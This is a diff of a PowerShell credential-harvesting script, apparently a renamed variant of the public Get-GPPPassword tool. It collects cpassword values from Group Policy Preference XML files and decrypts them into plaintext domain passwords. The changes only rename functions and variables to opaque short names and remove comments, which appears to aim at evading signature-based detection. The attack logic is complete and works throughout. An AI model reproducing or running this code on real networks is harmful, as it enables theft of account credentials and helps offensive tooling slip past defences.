@@ -11,23 +11,23 @@ function Get-Stuff {
     Set-StrictMode -Version 2
     
     #define helper function that decodes and decrypts password
-    function Get-DecryptedCpassword {
+    function Get-DCWD {
         [CmdletBinding()]
         Param (
-            [string] $Cpassword 
+            [string] $CPWD 
         )
 
         try {
             #Append appropriate padding based on string length  
-            $Mod = ($Cpassword.length % 4)
+            $Mod = ($CPWD.length % 4)
             
             switch ($Mod) {
-            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
-            '2' {$Cpassword += ('=' * (4 - $Mod))}
-            '3' {$Cpassword += ('=' * (4 - $Mod))}
+            '1' {$CPWD = $CPWD.Substring(0,$CPWD.Length -1)}
+            '2' {$CPWD += ('=' * (4 - $Mod))}
+            '3' {$CPWD += ('=' * (4 - $Mod))}
             }
 
-            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+            $Base64Decoded = [Convert]::FromBase64String($CPWD)
             
             #Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
@@ -38,8 +38,8 @@ function Get-Stuff {
             $AesIV = New-Object Byte[]($AesObject.IV.Length) 
             $AesObject.IV = $AesIV
             $AesObject.Key = $AesKey
-            $DecryptorObject = $AesObject.CreateDecryptor() 
-            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+            $DXPSObject = $AesObject.CreateDecryptor() 
+            [Byte[]] $OutBlock = $DXPSObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
             
             return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
         } 
@@ -48,7 +48,7 @@ function Get-Stuff {
     }  
     
     #define helper function to parse fields from xml files
-    function Get-GPPInnerFields {
+    function Get-GPPIFS {
     [CmdletBinding()]
         Param (
             $File
@@ -59,14 +59,12 @@ function Get-Stuff {
             $Filename = Split-Path $File -Leaf
             [xml] $Xml = Get-Content ($File)
 
-            #declare empty arrays
-            $Cpassword = @()
+            $CPWD = @()
             $UserName = @()
             $NewName = @()
             $Changed = @()
             $Password = @()
     
-            #check for password field
             if ($Xml.innerxml -like "*cpassword*"){
             
                 Write-Verbose "Potential password in $File"
@@ -74,50 +72,50 @@ function Get-Stuff {
                 switch ($Filename) {
 
                     'Groups.xml' {
-                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
         
                     'Services.xml' {  
-                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
         
                     'Scheduledtasks.xml' {
-                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
         
                     'DataSources.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                     }
                     
                     'Printers.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
   
                     'Drives.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $CPWD += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                     }
                 }
            }
                      
-           foreach ($Pass in $Cpassword) {
+           foreach ($Pass in $CPWD) {
                Write-Verbose "Decrypting $Pass"
-               $DecryptedPassword = Get-DecryptedCpassword $Pass
-               Write-Verbose "Decrypted a password of $DecryptedPassword"
+               $DPWDyptedPassword = Get-DCWD $Pass
+               Write-Verbose "Decrypted a password of $DPWDyptedPassword"
                #append any new passwords to array
-               $Password += , $DecryptedPassword
+               $Password += , $DPWDyptedPassword
            }
             
             #put [BLANK] in variables
@@ -156,7 +154,7 @@ function Get-Stuff {
         Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
     
         foreach ($File in $XMLFiles) {
-            $Result = (Get-GppInnerFields $File.Fullname)
+            $Result = (Get-GPPIFS $File.Fullname)
             Write-Output $Result
         }
     }
